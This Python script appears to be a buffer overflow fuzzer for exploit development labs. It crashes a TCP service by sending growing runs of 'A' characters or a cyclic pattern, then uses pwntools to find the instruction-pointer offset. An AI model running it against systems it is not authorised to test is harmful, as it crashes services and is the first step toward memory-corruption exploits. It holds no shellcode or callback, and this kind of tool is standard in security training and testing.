#!/usr/bin/env python3

import socket, time, sys
import argparse
from pwn import cyclic, cyclic_find


def fuzz_range(ip,port,prefix,size_range_start,size_range_stop,size_range_step,timeout):
    for size in range(size_range_start,size_range_stop,size_range_step):
        try:
            string = prefix + "A" * size
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                s.connect((ip, port))
                s.recv(1024)
                print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
                s.send(bytes(string, "latin-1"))
                s.recv(1024)
        except:
            print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
            sys.exit(0)
        time.sleep(1)


def fuzz_size(ip,port,prefix,size,timeout):
    try:
        string = prefix + "A" * size
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            s.recv(1024)
            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
            s.send(bytes(string, "latin-1"))
            s.recv(1024)
    except:
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)


def fuzz_pattern(ip,port,prefix,size,timeout):
    try:
        string = prefix + cyclic(size).decode('latin-1')
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            s.recv(1024)
            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
            s.send(bytes(string, "latin-1"))
            s.recv(1024)
    except:
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)

def get_offset(EIP_value):
    #hex_value = (bytes(EIP_value, "latin-1").decode()).encode()
    #bytes.fromhex(EIP_value).decode('latin-1')
    # reverse to change endien
    offset = cyclic_find(bytes.fromhex(EIP_value).decode('latin-1'))
    print(f"Offset is : {offset}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Buffer Overflow Fuzzer.py : python fuzzer.py -h")
    parser.add_argument('--ip',
        type=str,
        dest='ip',
        help='Target IP')
    parser.add_argument('--port',
        type=int,
        dest='port',
        help='Target Port')
    parser.add_argument('--prefix',
        type=str,
        dest='prefix',
        default='',
        help='Prefix value to send before string')
    parser.add_argument('--size',
        type=int,
        dest='size',
        help='Payload size to send')
    parser.add_argument('--range',
        type=str,
        dest='size_range',
        help='Payload size range to send. ie "100-500". EITHER use size OR range')
    parser.add_argument('--range-step',
        type=int,
        dest='size_range_step',
        default=100,
        help='Payload size range steps to send. default 100')
    parser.add_argument('--pattern',
        action='store_true',
        dest='pattern',
        help='Send unique pattern instead of A')
    parser.add_argument('--find-offset',
        dest='find_offset',
        type=str,
        help='provide EIP value WITH SPACES to find offset. ie "61 61 61 68"')
    args = parser.parse_args()

    ip = args.ip
    port = args.port
    prefix = args.prefix
    size = args.size
    timeout = 5

    if args.size_range:
        size_range_start = int(args.size_range.split('-')[0])
        size_range_stop = int(args.size_range.split('-')[1]) + 1
        size_range_step = args.size_range_step
        fuzz_range(ip,port,prefix,size_range_start,size_range_stop,size_range_step,timeout)
    elif args.pattern:
        fuzz_pattern(ip,port,prefix,size,timeout)
    elif args.size:
        fuzz_size(ip,port,prefix,size,timeout)
    elif args.find_offset:
        # change endien by flipping string
        find_offset_lst = []
        find_offset_lst = args.find_offset.split(" ")
        find_offset_lst.reverse()

        find_offset = ""
        for i in find_offset_lst:
            find_offset += i

        #print(find_offset)
        get_offset(find_offset)
    else:
        print("Provide Either '--range' or '--size'. For usage see -h")
